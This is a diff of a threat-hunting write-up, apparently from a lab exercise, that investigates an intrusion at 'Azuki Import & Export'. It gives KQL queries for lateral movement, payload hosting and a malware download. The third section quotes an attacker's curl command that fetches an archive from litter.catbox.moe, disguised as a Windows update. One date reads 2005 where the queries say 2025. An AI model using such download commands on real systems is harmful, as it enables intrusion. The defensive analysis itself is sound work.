@@ -17,73 +17,63 @@ Azuki Import & Export Trading Co. experienced continued malicious activity a few
 
 ## Investigation Steps
 
-### 1. Initial Access: Return Connection Source
+### 1. Lateral Movement: Source System & Compromised Credentials
 
-The attacker returned approximately 72 hours after the initial compromise using a different IP address to evade detection. The analysis revealed that the IP address 159.26.106.98 was the attacker's return connection. Since it's distinct from the original compromise IP, it's likely that the attacker attempted to utilize infrastructure rotation as an evasion technique.
+Searched for the source of lateral movement to the CEO's administrative PC and discovered consistent connection patterns from source IP address 10.1.0.204. The attacker established multiple RemoteInteractive sessions to azuki-adminpc during early morning hours (4-6 AM) on November 25, 2005. The clustering of connections during early morning hours indicates deliberate off-hours operational security to avoid detection. In addition, the investigation revealed that the yuki.tanaka account was compromised and subsequently reused for lateral movement to the CEO's administrative workstation. This account likely provided the attacker with elevated privileges and access to sensitive business systems. The investigation also confirmed that lateral movement from source IP 10.1.0.204 targeted azuki-adminpc, the CEO's administrative workstation.
 
 **Query used to locate events:**
 
 ```kql
 DeviceLogonEvents
 | where DeviceName contains "azuki"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-24))
-| where ActionType == "LogonSuccess"
-| where isnotempty(RemoteIP)
-| project TimeGenerated, RemoteIP, AccountName, LogonType
-| order by TimeGenerated asc
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where LogonType == "RemoteInteractive"
+| where RemoteIP != ""
+| project TimeGenerated, DeviceName, RemoteIP, AccountName, LogonType
+| order by TimeGenerated desc
 
 ```
-<img width="1923" height="637" alt="CH_Q1" src="https://github.com/user-attachments/assets/852e4110-1588-46ad-b8a4-19908d3ee061" />
+<img width="2368" height="815" alt="BT_Q1" src="https://github.com/user-attachments/assets/0e866f91-b1ba-43df-b75a-3944af3ba2d5" />
 
 ---
 
-### 2. Lateral Movement: Compromised Device & Compromised Account
+### 2. Execution: Payload Hosting Service
 
-Searched for evidence of lateral movement and discovered multiple RDP connections to the IP address 10.1.0.108, which was then correlated with logon events to identify the device name. The attacker used Remote Desktop (mstsc.exe) from the compromised system (azuki-sl) to connect to IP address 10.1.0.108. Further investigation revealed that the attacker performed lateral movement from the compromised workstation to the organization's primary file server (i.e., azuki-fileserver01), positioning themselves to access sensitive business data. In addition, the investigation also revealed that the attacker moved laterally to the file server using the fileadmin account. Compromising an administrative account with file management privileges also provides the attacker with elevated access to file shares and sensitive data.
+Searched for evidence of connections to external file hosting services and discovered that the attacker used the file hosting service litter.catbox.moe to to host the malicious payload. This temporary anonymous file hosting service provides automatic file deletion after download, complicating forensic recovery. In addition, this represents infrastructure rotation from previous operations, demonstrating operational security awareness and attempts at evading network-based blocking.
 
-**Queries used to locate events:**
+**Query used to locate events:**
 
 ```kql
-DeviceProcessEvents
-| where DeviceName contains "azuki"
-| where FileName == "mstsc.exe"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| project TimeGenerated, ProcessCommandLine, DeviceName
-| order by TimeGenerated asc
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
+| where isnotempty(RemoteUrl)
+| where RemoteUrl !has "microsoft" and RemoteUrl !has "windows" and RemoteUrl !has "adobe" and RemoteUrl !has "mcafee" and RemoteUrl !has "google"
+| project TimeGenerated, DeviceName, RemoteUrl
 
 ```
-<img width="1811" height="416" alt="CH_Q2A" src="https://github.com/user-attachments/assets/809b1b6d-290a-469d-bd4e-36bc5d145b24" />
+<img width="1923" height="739" alt="BT_Q4" src="https://github.com/user-attachments/assets/7f6c69c3-cb4e-4b72-be3e-00c6f0c7358f" />
 
 ---
 
-```kql
-DeviceLogonEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where RemoteIP == "10.1.0.108"
-| project TimeGenerated, DeviceName, RemoteIP, AccountName
-| order by TimeGenerated asc
+### 3. Execution: Malware Download
 
-```
-<img width="1786" height="929" alt="CH_Q2B" src="https://github.com/user-attachments/assets/ea68537c-539e-4168-9efa-dc8af73b68fb" />
-
----
-
-### 3. Discovery: Share Enumeration
-
-Searched for evidence of network share enumeration and discovered that the attacker executed the net share command to enumerate local network shares on the compromised file server. This command reveals all shared folders on the local system, allowing the attacker to identify sensitive data repositories for collection.
+Searched for evidence of malware download and discovered that the attacker used the following command to download the malicious archive from the previously identified hosting service (i.e., litter.catbox.moe): "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z. The payload was disguised as a Windows security update (i.e., KB5044273) to appear legitimate and evade suspicion during download and execution phases. 
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where DeviceName == "azuki-fileserver01"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where ProcessCommandLine has "net" and ProcessCommandLine has "share"
-| project TimeGenerated, ProcessCommandLine, FileName, AccountName
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
+| where ProcessCommandLine contains "catbox" or ProcessCommandLine contains "litter"
+| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="2069" height="273" alt="CH_Q4A" src="https://github.com/user-attachments/assets/308e0369-64bf-49af-8cb7-96e69f9722d7" />
+<img width="2556" height="608" alt="BT_Q5" src="https://github.com/user-attachments/assets/d301cdf2-3cc9-43b9-8f9a-fcba0a2959d6" />
 
 ---
 
